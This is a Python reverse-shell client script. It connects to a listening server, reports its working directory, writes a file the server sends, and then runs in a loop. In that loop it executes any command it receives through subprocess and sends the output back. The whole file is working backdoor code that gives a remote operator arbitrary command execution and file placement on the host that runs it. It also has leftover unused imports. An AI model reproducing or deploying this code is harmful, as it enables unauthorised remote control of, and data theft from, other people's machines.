
from ast import While
from mimetypes import init
import socket
import os
import subprocess
HOST = '127.0.0.1'    # The remote host
PORT = 50007   
SEPARATOR = "<sep>"
s = socket.socket()
           # The same port as used by the server
class client:
    def __init__(self, HOST,PORT, SEPARATOR,s):
        self.HOST  = HOST
        self.PORT  = PORT
        self.SEPARATOR  = SEPARATOR
        self.s = s

    
    def startconnection(self):
        self.s.connect((self.HOST, self.PORT))
        cwd = os.getcwd()
        self.s.send(cwd.encode())
    def filecreate(self):
        filename = self.s.recv(1024).decode("utf-8")
        data = self.s.recv(1024).decode('utf-8')
        file = open(filename,"w")
        file.write(data)
        file.close()
        file2 = open(filename, "r")
        z =file2.read()
        print(z)
        file.close()
    
        # receive the command from the server
    def shell(self):
        while True:

            command = self.s.recv(1024).decode()
            splited_command = command.split()
            
                # if the command is exit, just break out of the loop
                
            if splited_command[0].lower() == "cd":
                # cd command, change directory
                try:
                    os.chdir(' '.join(splited_command[1:]))
                except FileNotFoundError as e:
                    # if there is an error, set as the output
                    output = str(e)
                else:
                    # if operation is successful, empty message
                    output = ""
            

            else:
                # execute the command and retrieve the results
                output = subprocess.getoutput(command)
            
            # get the current working directory as output
            cwd = os.getcwd()
            # send the results back to the server
            message = f"{output}{SEPARATOR}{cwd}"
            self.s.send(message.encode())
        s.close()

klient = client(HOST,PORT,SEPARATOR,s)
klient.startconnection()
klient.filecreate()
klient.shell()